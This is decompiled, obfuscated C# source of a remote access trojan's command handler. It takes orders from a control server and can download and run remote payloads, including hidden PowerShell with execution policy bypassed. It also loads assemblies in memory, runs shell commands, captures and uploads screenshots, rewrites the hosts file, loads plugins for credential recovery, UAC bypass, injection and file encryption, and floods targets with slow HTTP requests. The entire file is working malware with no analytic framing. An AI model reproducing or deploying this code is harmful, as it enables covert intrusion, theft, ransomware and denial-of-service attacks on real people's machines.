using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0
{
	// Token: 0x0200000A RID: 10
	public class GClass3
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00005558 File Offset: 0x00003758
		public static void smethod_0(byte[] byte_0)
		{
			try
			{
				string[] array = Strings.Split(Class6.smethod_7(Class6.smethod_15(byte_0)), GClass0.string_4, -1, CompareMethod.Binary);
				string text = array[0];
				if (Operators.CompareString(text, "pong", false) == 0)
				{
					GClass2.bool_1 = false;
					GClass2.smethod_12("pong" + GClass0.string_4 + Conversions.ToString(GClass2.int_0));
					GClass2.int_0 = 0;
				}
				else if (Operators.CompareString(text, "rec", false) == 0)
				{
					Class6.smethod_17();
					Application.Restart();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(text, "CLOSE", false) == 0)
				{
					GClass2.socket_0.Shutdown(SocketShutdown.Both);
					GClass2.socket_0.Close();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(text, "uninstall", false) == 0)
				{
					GClass4.smethod_0(false, null, null);
				}
				else if (Operators.CompareString(text, "update", false) == 0)
				{
					GClass4.smethod_0(true, array[1], Class6.smethod_12(Convert.FromBase64String(array[2])));
				}
				else if (Operators.CompareString(text, "DW", false) == 0)
				{
					GClass3.smethod_8(array[1], Class6.smethod_12(Convert.FromBase64String(array[2])));
				}
				else if (Operators.CompareString(text, "FM", false) == 0)
				{
					GClass3.smethod_9(Class6.smethod_12(Convert.FromBase64String(array[1])));
				}
				else if (Operators.CompareString(text, "LN", false) == 0)
				{
					try
					{
						ServicePointManager.Expect100Continue = true;
						ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
						ServicePointManager.DefaultConnectionLimit = 9999;
					}
					catch (Exception ex)
					{
					}
					string text2 = Path.Combine(Path.GetTempPath(), Class6.smethod_1(6) + array[1]);
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[2], text2);
					Process.Start(text2);
				}
				else if (Operators.CompareString(text, "Urlopen", false) == 0)
				{
					GClass3.smethod_6(array[1], false);
				}
				else if (Operators.CompareString(text, "Urlhide", false) == 0)
				{
					GClass3.smethod_6(array[1], true);
				}
				else if (Operators.CompareString(text, "PCShutdown", false) == 0)
				{
					Interaction.Shell("shutdown.exe /f /s /t 0", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(text, "PCRestart", false) == 0)
				{
					Interaction.Shell("shutdown.exe /f /r /t 0", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(text, "PCLogoff", false) == 0)
				{
					Interaction.Shell("shutdown.exe -L", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(text, "RunShell", false) == 0)
				{
					Interaction.Shell(array[1], AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(text, "StartDDos", false) == 0)
				{
					try
					{
						GClass3.thread_0.Abort();
					}
					catch (Exception ex2)
					{
					}
					GClass3.thread_0 = new Thread(new ParameterizedThreadStart(GClass3._Lambda$__6));
					GClass3.thread_0.Start(array[1]);
				}
				else
				{
					if (Operators.CompareString(text, "StopDDos", false) == 0)
					{
						try
						{
							GClass3.thread_0.Abort();
							goto IL_0796;
						}
						catch (Exception ex3)
						{
							goto IL_0796;
						}
					}
					if (Operators.CompareString(text, "StartReport", false) == 0)
					{
						try
						{
							GClass3.thread_1.Abort();
						}
						catch (Exception ex4)
						{
						}
						GClass3.thread_1 = new Thread(new ParameterizedThreadStart(GClass3._Lambda$__7));
						GClass3.thread_1.Start(array[1]);
					}
					else
					{
						if (Operators.CompareString(text, "StopReport", false) == 0)
						{
							try
							{
								GClass3.thread_1.Abort();
								goto IL_0796;
							}
							catch (Exception ex5)
							{
								goto IL_0796;
							}
						}
						if (Operators.CompareString(text, "Xchat", false) == 0)
						{
							GClass2.smethod_12("Xchat" + GClass0.string_4 + Class6.smethod_8());
						}
						else if (Operators.CompareString(text, "Hosts", false) == 0)
						{
							string text3 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
							GClass2.smethod_12(string.Concat(new string[]
							{
								"Hosts",
								GClass0.string_4,
								Class6.smethod_8(),
								GClass0.string_4,
								text3,
								GClass0.string_4,
								File.ReadAllText(text3)
							}));
						}
						else
						{
							if (Operators.CompareString(text, "Shosts", false) == 0)
							{
								try
								{
									File.WriteAllText(array[1], array[2]);
									GClass2.smethod_12(string.Concat(new string[]
									{
										"HostsMSG",
										GClass0.string_4,
										Class6.smethod_8(),
										GClass0.string_4,
										"Modified successfully!"
									}));
									goto IL_0796;
								}
								catch (Exception ex6)
								{
									GClass2.smethod_12(string.Concat(new string[]
									{
										"HostsErr",
										GClass0.string_4,
										Class6.smethod_8(),
										GClass0.string_4,
										ex6.Message
									}));
									goto IL_0796;
								}
							}
							if (Operators.CompareString(text, "DDos", false) == 0)
							{
								GClass2.smethod_12("DDos");
							}
							else if (Operators.CompareString(text, "plugin", false) == 0)
							{
								GClass3.string_0 = array;
								if (Class6.smethod_11(array[1]) == null)
								{
									GClass2.smethod_12("sendPlugin" + GClass0.string_4 + array[1]);
								}
								else
								{
									GClass3.smethod_1(Class6.smethod_12(Class6.smethod_11(array[1])));
								}
							}
							else if (Operators.CompareString(text, "savePlugin", false) == 0)
							{
								byte[] array2 = Convert.FromBase64String(array[2]);
								Class6.smethod_10(array[1], array2);
								GClass3.smethod_1(Class6.smethod_12(array2));
							}
							else if (Operators.CompareString(text, "RemovePlugins", false) == 0)
							{
								Class2.Ⴓ.Registry.CurrentUser.DeleteSubKey(Class6.string_0);
								GClass3.smethod_2("Plugins Removed!");
							}
							else if (Operators.CompareString(text, "OfflineGet", false) == 0)
							{
								GClass2.smethod_12(string.Concat(new string[]
								{
									"OfflineGet",
									GClass0.string_4,
									Class6.smethod_8(),
									GClass0.string_4,
									File.ReadAllText(GClass0.string_8)
								}));
							}
							else if (Operators.CompareString(text, "$Cap", false) == 0)
							{
								try
								{
									try
									{
										if (!Class6.bool_0)
										{
											Class6.SetProcessDpiAwareness(2);
											Class6.bool_0 = true;
										}
									}
									catch (Exception ex7)
									{
									}
									Rectangle bounds = Screen.PrimaryScreen.Bounds;
									Rectangle bounds2 = Screen.PrimaryScreen.Bounds;
									Bitmap bitmap = new Bitmap(bounds2.Width, bounds.Height, PixelFormat.Format16bppRgb555);
									Graphics graphics = Graphics.FromImage(bitmap);
									Size size = new Size(bitmap.Width, bitmap.Height);
									graphics.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
									MemoryStream memoryStream = new MemoryStream();
									Bitmap bitmap2 = new Bitmap(256, 156);
									Graphics graphics2 = Graphics.FromImage(bitmap2);
									Graphics graphics3 = graphics2;
									Image image = bitmap;
									bounds2 = new Rectangle(0, 0, 256, 156);
									Rectangle rectangle = bounds2;
									Rectangle rectangle2 = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
									graphics3.DrawImage(image, rectangle, rectangle2, GraphicsUnit.Pixel);
									bitmap2.Save(memoryStream, ImageFormat.Jpeg);
									GClass2.smethod_12(string.Concat(new string[]
									{
										"#CAP",
										GClass0.string_4,
										Class6.smethod_8(),
										GClass0.string_4,
										Convert.ToBase64String(Class6.smethod_13(memoryStream.ToArray()))
									}));
									try
									{
										graphics.Dispose();
										memoryStream.Dispose();
										bitmap2.Dispose();
										graphics2.Dispose();
										bitmap.Dispose();
									}
									catch (Exception ex8)
									{
									}
								}
								catch (Exception ex9)
								{
								}
							}
						}
					}
				}
				IL_0796:;
			}
			catch (Exception ex10)
			{
				GClass3.smethod_3(ex10.Message);
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00005E0C File Offset: 0x0000400C
		public static void smethod_1(byte[] byte_0)
		{
			try
			{
				foreach (Type type in AppDomain.CurrentDomain.Load(byte_0).GetTypes())
				{
					if (Operators.CompareString(type.Name, "Plugin", false) == 0)
					{
						foreach (MethodInfo obj in type.GetMethods())
						{
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "Run", false))
							{
								NewLateBinding.LateCall(obj, null, "Invoke", new object[]
								{
									null,
									new object[]
									{
										GClass0.string_1,
										GClass0.string_2,
										GClass0.string_4,
										GClass0.string_3,
										Class6.smethod_8()
									}
								}, null, null, null, true);
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "RunRecovery", false))
							{
								GClass2.smethod_12(Conversions.ToString(Operators.ConcatenateObject("Recovery" + GClass0.string_4 + Class6.smethod_8() + GClass0.string_4 + Conversions.ToString(Convert.ToInt32(GClass3.string_0[2])) + GClass0.string_4, NewLateBinding.LateGet(obj, null, "Invoke", new object[]
								{
									null,
									new object[] { Convert.ToInt32(GClass3.string_0[2]) }
								}, null, null, null))));
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "RunOptions", false))
							{
								string text = Conversions.ToString(NewLateBinding.LateGet(obj, null, "Invoke", new object[]
								{
									null,
									new object[] { GClass3.string_0[2] }
								}, null, null, null));
								if (!text.StartsWith("Error"))
								{
									GClass3.smethod_2(text);
								}
								else
								{
									GClass3.smethod_3(text);
								}
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "injRun", false))
							{
								if (File.Exists(GClass3.string_0[2]))
								{
									NewLateBinding.LateCall(obj, null, "Invoke", new object[]
									{
										null,
										new object[]
										{
											GClass3.string_0[2],
											Class6.smethod_12(Convert.FromBase64String(GClass3.string_0[3]))
										}
									}, null, null, null, true);
								}
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "UACFunc", false))
							{
								GClass3.smethod_3(Conversions.ToString(NewLateBinding.LateGet(obj, null, "Invoke", new object[]
								{
									null,
									new object[] { Convert.ToInt32(GClass3.string_0[2]) }
								}, null, null, null)));
								return;
							}
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "ENC", false))
							{
								if (Convert.ToBoolean(GClass3.string_0[2]))
								{
									if (GClass3.int_0 != 1)
									{
										GClass3.int_0 = 1;
										GClass3.smethod_2(Conversions.ToString(NewLateBinding.LateGet(obj, null, "Invoke", new object[]
										{
											null,
											new object[]
											{
												Class6.smethod_8(),
												Class6.smethod_12(Convert.FromBase64String(GClass3.string_0[3])),
												GClass3.string_0[4],
												GClass3.string_0[5],
												GClass3.string_0[6]
											}
										}, null, null, null)));
										GClass3.int_0 = 2;
									}
									return;
								}
							}
							else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, null, "Name", new object[0], null, null, null), "DEC", false) && !Convert.ToBoolean(GClass3.string_0[2]))
							{
								if (GClass3.int_0 == 2)
								{
									GClass3.int_0 = 1;
									GClass3.smethod_2(Conversions.ToString(NewLateBinding.LateGet(obj, null, "Invoke", new object[]
									{
										null,
										new object[] { Class6.smethod_8() }
									}, null, null, null)));
									GClass3.int_0 = 0;
								}
								return;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				GClass3.smethod_3("Plugin Error! " + ex.Message);
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000062E4 File Offset: 0x000044E4
		public static void smethod_2(string string_2)
		{
			try
			{
				GClass2.smethod_12("Msg" + GClass0.string_4 + string_2);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00006328 File Offset: 0x00004528
		public static void smethod_3(string string_2)
		{
			try
			{
				GClass2.smethod_12("Error" + GClass0.string_4 + string_2);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000636C File Offset: 0x0000456C
		public static void smethod_4(string string_2)
		{
			checked
			{
				try
				{
					GClass3.Class5 @class = new GClass3.Class5();
					@class.string_0 = string_2.Split(new char[] { ':' })[0];
					@class.string_1 = string_2.Split(new char[] { ':' })[1];
					int num = Convert.ToInt32(string_2.Split(new char[] { ':' })[2]) * 60;
					TimeSpan timeSpan = TimeSpan.FromSeconds((double)num);
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (timeSpan > stopwatch.Elapsed && GClass2.bool_0)
					{
						int num2 = 0;
						do
						{
							Thread thread = new Thread(new ThreadStart(@class._Lambda$__8));
							thread.Start();
							num2++;
						}
						while (num2 <= 19);
						Thread.Sleep(5000);
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x0000645C File Offset: 0x0000465C
		public static void smethod_5(string string_2)
		{
			List<string> list = new List<string>();
			foreach (string obj in Strings.Split(string_2, ",", -1, CompareMethod.Binary))
			{
				list.Add(Conversions.ToString(NewLateBinding.LateGet(obj, null, "ToLower", new object[0], null, null, null)));
			}
			int num = 30;
			checked
			{
				while (GClass2.bool_0)
				{
					foreach (Process process in Process.GetProcesses())
					{
						if (!string.IsNullOrEmpty(process.MainWindowTitle) && list.Any(new Func<string, bool>(process.MainWindowTitle.ToLower().Contains)) && num > 30)
						{
							num = 0;
							GClass3.smethod_2("Open [" + process.MainWindowTitle.ToLower() + "]");
						}
					}
					num++;
					Thread.Sleep(1000);
				}
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x0000654C File Offset: 0x0000474C
		public static void smethod_6(string string_2, bool bool_0)
		{
			if (bool_0)
			{
				try
				{
					ServicePointManager.Expect100Continue = true;
					ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
					ServicePointManager.DefaultConnectionLimit = 9999;
				}
				catch (Exception ex)
				{
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_2);
				httpWebRequest.UserAgent = Class6.string_3[new Random().Next(Class6.string_3.Length)];
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.Timeout = 10000;
				httpWebRequest.Method = "GET";
				using ((HttpWebResponse)httpWebRequest.GetResponse())
				{
					return;
				}
			}
			Process.Start(string_2);
		}

		// Token: 0x06000039 RID: 57
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string string_2, int int_1, int int_2, int int_3, int int_4, int int_5, int int_6, int int_7);

		// Token: 0x0600003A RID: 58
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_3, int int_2);

		// Token: 0x0600003B RID: 59 RVA: 0x0000660C File Offset: 0x0000480C
		public static bool smethod_7()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						string text = null;
						short num2 = (short)num;
						string text2 = Strings.Space(100);
						if (GClass3.capGetDriverDescriptionA(num2, ref text2, 100, ref text, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto IL_002C;
						}
					}
					return true;
					IL_002C:;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00006668 File Offset: 0x00004868
		private static void smethod_8(string string_2, byte[] byte_0)
		{
			object obj = Path.Combine(Path.GetTempPath(), Class6.smethod_1(6) + string_2);
			File.WriteAllBytes(Conversions.ToString(obj), byte_0);
			Thread.Sleep(500);
			if (string_2.ToLower().EndsWith(".ps1"))
			{
				Process.Start(new ProcessStartInfo("powershell.exe")
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("-ExecutionPolicy Bypass -File \"", obj), "\""))
				});
			}
			else
			{
				object obj2 = null;
				Type typeFromHandle = typeof(Process);
				string text = "Start";
				object[] array = new object[] { RuntimeHelpers.GetObjectValue(obj) };
				object[] array2 = array;
				string[] array3 = null;
				Type[] array4 = null;
				bool[] array5 = new bool[] { true };
				NewLateBinding.LateCall(obj2, typeFromHandle, text, array2, array3, array4, array5, true);
				if (array5[0])
				{
					obj = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x0000673C File Offset: 0x0000493C
		private static object smethod_9(byte[] byte_0)
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(byte_0);
				MethodInfo entryPoint = assembly.EntryPoint;
				object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
				object[] array = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					array = null;
				}
				entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), array);
			}
			catch (Exception ex)
			{
			}
			object obj;
			return obj;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000023D9 File Offset: 0x000005D9
		private static void _Lambda$__6(object object_0)
		{
			GClass3.smethod_4(Conversions.ToString(object_0));
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000023E6 File Offset: 0x000005E6
		private static void _Lambda$__7(object object_0)
		{
			GClass3.smethod_5(Conversions.ToString(object_0));
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000067B4 File Offset: 0x000049B4
		static GClass3()
		{
			char[] array = new char[8];
			array[3] = '\u1acc';
			array[0] = 'ڭ';
			array[6] = '㚆';
			array[1] = 'ᱍ';
			array[2] = '᎗';
			array[7] = 'Ǻ';
			array[5] = 'Ⳏ';
			array[4] = '㫝';
			GClass3.string_1 = new string[144];
			GClass3.array_0 = array;
		}

		// Token: 0x0400001C RID: 28
		public static string[] string_0;

		// Token: 0x0400001D RID: 29
		public static int int_0;

		// Token: 0x0400001E RID: 30
		public static Thread thread_0;

		// Token: 0x0400001F RID: 31
		public static Thread thread_1;

		// Token: 0x04000020 RID: 32
		public static IntPtr intptr_0;

		// Token: 0x04000021 RID: 33
		private static readonly Array array_0;

		// Token: 0x04000022 RID: 34
		private static readonly Array array_1 = new char[2105];

		// Token: 0x04000023 RID: 35
		private static readonly string[] string_1;

		// Token: 0x04000024 RID: 36 RVA: 0x00002050 File Offset: 0x00000250
		// Note: this field is marked with 'hasfieldrva' and has an initial value of '0'.
		internal static byte struct0_0;

		// Token: 0x0200000B RID: 11
		internal sealed class Class5
		{
			// Token: 0x06000042 RID: 66 RVA: 0x00006830 File Offset: 0x00004A30
			public void _Lambda$__8()
			{
				try
				{
					Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.Connect(this.string_0, Convert.ToInt32(this.string_1));
					string text = string.Concat(new string[]
					{
						"POST / HTTP/1.1\r\nHost: ",
						this.string_0,
						"\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: ",
						Class6.string_3[new Random().Next(Class6.string_3.Length)],
						"\r\nContent-length: 5235\r\n\r\n"
					});
					byte[] bytes = Encoding.UTF8.GetBytes(text);
					socket.Send(bytes, 0, bytes.Length, SocketFlags.None);
					Thread.Sleep(2500);
					socket.Dispose();
				}
				catch (Exception ex)
				{
				}
			}

			// Token: 0x04000025 RID: 37
			public string string_0;

			// Token: 0x04000026 RID: 38
			public string string_1;
		}

		// Token: 0x0200000C RID: 12
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 4210)]
		private struct Struct0
		{
		}
	}
}
